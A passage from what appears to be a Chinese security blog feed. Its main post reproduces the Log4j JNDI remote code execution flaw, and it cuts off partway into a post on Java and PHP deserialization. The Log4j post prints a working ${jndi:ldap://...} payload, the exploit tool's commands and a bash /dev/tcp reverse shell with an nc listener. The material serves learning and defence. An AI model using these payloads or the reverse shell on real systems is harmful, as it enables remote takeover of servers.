class="hljs-number">0</span>.png全国统一发票监制章<br><span class="hljs-attribute">seal</span>/<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>.png国家税务总局<br><span class="hljs-attribute">seal</span>/<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">2</span>.png山东省税务局<br></code></pre></td></tr></table></figure><p><img src="/images/1-1-1.png" alt="1-1-1"></p><p><img src="/images/1-1-2.png" alt="1-1-2"></p><p><img src="/images/1-1-0.png" alt="1-1-0"></p>]]></content>
    
    
    
    <tags>
      
      <tag>图像处理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j JNDI远程代码注入漏洞学习</title>
    <link href="/blog/2021/12/23/Log4j-JNDI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/blog/2021/12/23/Log4j-JNDI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>最近身边很多人都在关注这个重大的Log4j2远程代码注入漏洞，影响范围非常广，因此学习一下漏洞原理以及做一下简单的复现。</strong></p><p><img src="/images/java.jpg"></p><span id="more"></span><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h3><p>Log4j2是log4j 1.x的改进版，据说采用了一些新技术（无锁异步等），使得日志的吞吐量、性能比log4j 1.x提高了10倍，并解决了一些死锁的bug，而且配置更加简单灵活。log4j2被大量用于业务系统开发，记录日志信息，很多互联网公司以及大量的开源组件都使用该组件记录日志信息。</p><h3 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gcode">用户认证：不需要用户认证<br><br>触发方式：远程<br><br>利用条件：需要外网访问权限<br><br>影响版本：<span class="hljs-number">2.0</span> ≤ Apache Lo<span class="hljs-name">g4</span>j<span class="hljs-number">2</span> &lt; <span class="hljs-number">2.15</span><span class="hljs-number">.0</span>-rc<span class="hljs-number">2</span><br><br>利用难度：极低，无需授权即可远程代码执行<br><br>威胁等级：严重，能造成远程代码执行<br></code></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>JNDI（Java Naming and Directory Interface–Java命名和目录接口）是Java中为命名和目录服务提供接口的API，通过名字可知道，JNDI主要由两部分组成：Naming（命名）和Directory（目录），其中Naming是指将对象通过唯一标识符绑定到一个上下文Context，同时可通过唯一标识符查找获得对象，而Directory主要指将某一对象的属性绑定到Directory的上下文DirContext中，同时可通过名字获取对象的属性同时操作属性。</p><p>JNDI主要由JNDI API和JNDI SPI两部分组成，Java应用程序通过JNDI API访问目录服务，而JNDI API会调用Naming Manager实例化JNDI SPI，然后通过JNDI SPI去操作命名或目录服务其如LDAP， DNS，RMI等，JNDI内部已实现了对LDAP，DNS， RMI等目录服务器的操作API。</p><p>java应用程序中可以调用JNDI协议访问远程服务，其底层包含了RMI、LDAP、DNS等协议的调用，可以通过JNDI访问远程的相关目录服务，本次爆发的攻击payload都是通过jndi调用了远程的恶意class，然后本地反序列化执行。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>log4j的源码中执行了lookup方法是导致本次漏洞的根本原因。</p><p>当有客户端通过lookup(“refObj”)获取远程对象时，获取的是一个Reference存根(Stub)，由于是Reference存根，所以客户端会先在本地classpath中去检查是否存在refClassName，如果不存在则去指定的url中动态加载，在log4j的服务器上执行加载类的实例化操作（静态变量、静态代码块）</p><p>攻击者在自己的客户端启动一个带有恶意代码的rmi服务，通过服务端的log4j的漏洞，向服务端的jndi context lookup的时候连接自己的rmi服务器，服务端连接rmi服务器执行lookup的时候会通过rmi查询到该地址指向的引用并且本地实例化这个类，所以在类中的构造方法或者静态代码块中写入逻辑，就会在服务端（jndi rmi过程中的客户端）实例化的时候执行到这段逻辑，导致jndi注入。</p><p><img src="/images/log4jvul.png"></p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>受害者：JDK 8u311</p><p>攻击者远程服务器上准备ldap或rmi服务，使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit/">JNDI-Injection-Exploit: JNDI注入测试工具</a>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">java -jar JNDI-Injection-Exploit-<span class="hljs-number">1.0</span>-SNAPSHOT-<span class="hljs-attribute">all</span><span class="hljs-selector-class">.jar</span> <span class="hljs-selector-attr">[-C]</span> <span class="hljs-selector-attr">[command]</span> <span class="hljs-selector-attr">[-A]</span> <span class="hljs-selector-attr">[address]</span><br></code></pre></td></tr></table></figure><p>其中:</p><ul><li><p><strong>-C</strong> - 远程class文件中要执行的命令。</p><p>（可选项 , 默认命令是mac下打开计算器，即”open &#x2F;Applications&#x2F;Calculator.app”）</p></li><li><p><strong>-A</strong> - 服务器地址，可以是IP地址或者域名。</p></li></ul><p>执行后会在控制台输出注入的ldap和rmi地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="hljs-string">&quot;calc&quot;</span> -A <span class="hljs-string">&quot;attacker server ip addr&quot;</span><br>[ADDRESS] &gt;&gt; attacker server ip addr<br>[COMMAND] &gt;&gt; calc<br>----------------------------JNDI Links---------------------------- <br>Target environment(Build <span class="hljs-keyword">in</span> JDK whose trustURLCodebase is <span class="hljs-literal">false</span> and have Tomcat 8+ or SpringBoot 1.2.x+ <span class="hljs-keyword">in</span> classpath):<br>rmi://attacker server ip addr:1099/emqemo<br>Target environment(Build <span class="hljs-keyword">in</span> JDK 1.7 whose trustURLCodebase is <span class="hljs-literal">true</span>):<br>rmi://attacker server ip addr:1099/dzjoi9<br>ldap://attacker server ip addr:1389/dzjoi9<br>Target environment(Build <span class="hljs-keyword">in</span> JDK 1.8 whose trustURLCodebase is <span class="hljs-literal">true</span>):<br>rmi://attacker server ip addr:1099/e54bwj<br>ldap://attacker server ip addr:1389/e54bwj<br><br>----------------------------Server Log----------------------------<br>2022-2-23 17:32:50 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:8180<br>2022-2-23 17:32:50 [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:1099<br>2022-2-23 17:32:50 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389<br></code></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="Java项目代码"><a href="#Java项目代码" class="headerlink" title="Java项目代码"></a>Java项目代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log4j11Test</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(<span class="hljs-string">&quot;Log4jDemoApplication&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<span class="hljs-comment">//JDK开启远程调用</span><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        logger.error(<span class="hljs-string">&quot;$&#123;jndi:ldap://attacker server ip addr:1389/e54bwj&#125;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>高版本的jdk默认关闭了trustURLCodebase，这里手动开启一下。</p><h4 id="pom依赖配置"><a href="#pom依赖配置" class="headerlink" title="pom依赖配置"></a>pom依赖配置</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>执行以上代码后，就可以在受害者机器上弹出计算机</p><p><img src="/images/log4jattack.png"></p><p>当然也可以做反弹shell，在攻击者服务器使用nc监听一个端口，设置command为<code>bash -i &gt;&amp; /dev/tcp/attacker server ip/9999 0&gt;&amp;1</code>即可，受害者使用交互式bash，与攻击者9999端口建立连接，然后在重定向个TCP 9999会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p><p>然后在攻击者服务器上使用nc监听9999端口即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br>Listening on [0.0.0.0] (family 0, port 9999)<br>Connection from victim ip 54317 received!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化漏洞学习</title>
    <link href="/blog/2021/05/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/blog/2021/05/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>序列化(serialize)是指将对象转换成可传输、存储的字节流，反序列化则相反，是将字节流转换成对象。Java和PHP等面向对象的语言提供了默认的序列化和反序列化实现。这个默认序列化功能如果使用不当，则可能造成潜在的被攻击风险。</strong></p><p><img src="/images/fj30.jpg"></p><span id="more"></span><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h3 id="为什么要有序列化？"><a href="#为什么要有序列化？" class="headerlink" title="为什么要有序列化？"></a>为什么要有序列化？</h3><p>序列化的本质是内存对象到数据流的一种转换，我们知道内存中的东西不具备持久性，但有些场景却需要将对象持久化保存或传输。例如缓存系统中存储了用户的 Session，如果缓存系统直接下线，带系统重启后用户就需要重新登录，为了使缓存系统内存中的 Session 对象一直有效，就需要有一种机制将对象从内存中保存入磁盘，并且待系统重启后还能将 Session 对象恢复到内存中，这个过程就是对象序列化与反序列化的过程，从而避免了用户会话的有效性受系统故障的影响。</p><h3 id="Java的序列化和反序列化"><a href="#Java的序列化和反序列化" class="headerlink" title="Java的序列化和反序列化"></a>Java的序列化和反序列化</h3><p>在JDK中提供了类ObjectOutputStream用于将对象序列化成byte数组，提供了ObjectInputStream用于将byte数组反序列化为对象。所有实现了Serializable接口的类的实例都可以使用这两个默认工具类进行序列化和反序列化。下面是一个序列化和反序列化的例子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaSerialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String user;<br>    <span class="hljs-keyword">private</span> String pwd;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 构建一个可以被序列化的对象</span><br>        <span class="hljs-type">JavaSerialize</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaSerialize</span>();<br>        obj.user = <span class="hljs-string">&quot;luckyx&quot;</span>;<br>        obj.pwd = <span class="hljs-string">&quot;password&quot;</span>;<br>        <br>        <span class="hljs-comment">// 将对象序列化为字节流</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br><br>        <span class="hljs-comment">//System.out.println(baos);</span><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fileWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;./baos.txt&quot;</span>);<br>        fileWriter.write(String.valueOf(baos));<br>        fileWriter.close();<br><br>        <span class="hljs-comment">// 将字节流反序列化为对象</span><br>        <span class="hljs-type">byte</span>[] bytes = baos.toByteArray();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-type">JavaSerialize</span> <span class="hljs-variable">userObj</span> <span class="hljs-operator">=</span> (JavaSerialize)ois.readObject();<br>        <br>        <span class="hljs-comment">// 原对象和反序列化出来的对象不是同一个对象，但内容相同</span><br>        System.out.println(String.format(<span class="hljs-string">&quot;obj == userObj ? %B&quot;</span>, obj == userObj));<br>        System.out.println(String.format(<span class="hljs-string">&quot;userObj.user = %s, userObj.pwd = %s&quot;</span><br>                , userObj.user, userObj.pwd));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上述例子中，反序列化出的userObj为新的对象，其包含的属性值和原始对象obj完全一致。</p><p>Java序列化机制中，还允许开发人员自定义序列化和反序列化操作。例如，在上例中，我们希望生成的byte数组中不要存储明文密码，可以在序列化时对pwd属性进行base64处理，在反序列化时读pwd属性进行解码，示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaSerialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String user;<br>    <span class="hljs-keyword">private</span> String pwd;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 自定义序列化方法，将自定义内容写入序列化字节流中</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span><br>            <span class="hljs-keyword">throws</span> java.io.IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">origin</span> <span class="hljs-operator">=</span> pwd;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        pwd = encoder.encodeToString(pwd.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>        s.defaultWriteObject();<br>        pwd = origin;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 自定义反序列化方法，定义自己的字节流读取方式</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>            <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br>        Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();<br>        pwd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decoder.decode(pwd), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 构建一个可以被序列化的对象</span><br>        <span class="hljs-type">JavaSerialize</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaSerialize</span>();<br>        obj.user = <span class="hljs-string">&quot;luckyx&quot;</span>;<br>        obj.pwd = <span class="hljs-string">&quot;password&quot;</span>;<br><br>        <span class="hljs-comment">// 将对象序列化为字节流</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br><br>        <span class="hljs-comment">//System.out.println(baos);</span><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fileWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;./baos.txt&quot;</span>);<br>        fileWriter.write(String.valueOf(baos));<br>        fileWriter.close();<br><br>        <span class="hljs-comment">// 将字节流反序列化为对象</span><br>        <span class="hljs-type">byte</span>[] bytes = baos.toByteArray();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-type">JavaSerialize</span> <span class="hljs-variable">userObj</span> <span class="hljs-operator">=</span> (JavaSerialize)ois.readObject();<br><br>        <span class="hljs-comment">// 原对象和反序列化出来的对象不是同一个对象，但内容相同</span><br>        System.out.println(String.format(<span class="hljs-string">&quot;obj == userObj ? %B&quot;</span>, obj == userObj));<br>        System.out.println(String.format(<span class="hljs-string">&quot;userObj.user = %s, userObj.pwd = %s&quot;</span><br>                , userObj.user, userObj.pwd));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>writeObject和readObject分别用来编写自定义的反序列化和序列化程序，其访问修饰符均为private，在执行序列化和反序列化操作时会自动调用这两个方法。上述例子中，序列化时，首先将pwd进行base64编码，再执行默认序列化操作，则序列化后存储在bytes中的密码是已经base64编码后的密码。在反序列化时，首先调用默认的反序列化方法，再将pwd进行base64解码。</p><h3 id="PHP的序列化和反序列化"><a href="#PHP的序列化和反序列化" class="headerlink" title="PHP的序列化和反序列化"></a>PHP的序列化和反序列化</h3><p>PHP 的所谓的序列化也是一个将各种类型的数据，压缩并按照一定格式存储的过程，所使用的函数是serialize()，一个例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">phpSerialize</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;Inactive&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;test&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_flag</span>(<span class="hljs-params"><span class="hljs-variable">$flag</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = <span class="hljs-variable">$flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;flag;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phpSerialize</span>();<br><span class="hljs-variable">$object</span>-&gt;<span class="hljs-title function_ invoke__">set_flag</span>(<span class="hljs-string">&#x27;Active&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;serialize.txt&quot;</span>, <span class="hljs-variable">$data</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>序列化后输出文件内容如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">O:12:&quot;phpSerialize&quot;:2:&#123;s:18:&quot; phpSerialize flag&quot;;s:6:&quot;Active&quot;;s:7:&quot; * test&quot;;s:4:&quot;test&quot;;&#125;<br></code></pre></td></tr></table></figure><ul><li>O代表这是一个对象</li><li>12代表对象名长度为12</li><li>“phpSerialize”代表对象名</li><li>2代表对象有两个属性</li><li>s:18:” phpSerialize flag”;代表属性名，由于flag是私有的，因此序列化之后为：%00类名%00属性名</li><li>s:6:”Active”;为上一个属性名flag的属性值</li><li>s:7:” * test”;是test的属性名，我们可以看到protected修饰符修饰的属性序列化后为：%00*%00属性名</li></ul><p>unserialize()反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">phpSerialize</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;Inactive&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;test&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_flag</span>(<span class="hljs-params"><span class="hljs-variable">$flag</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = <span class="hljs-variable">$flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;flag;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//$object = new phpSerialize();</span><br><span class="hljs-comment">//$object-&gt;set_flag(&#x27;Active&#x27;);</span><br><span class="hljs-comment">//$data = serialize($object);</span><br><span 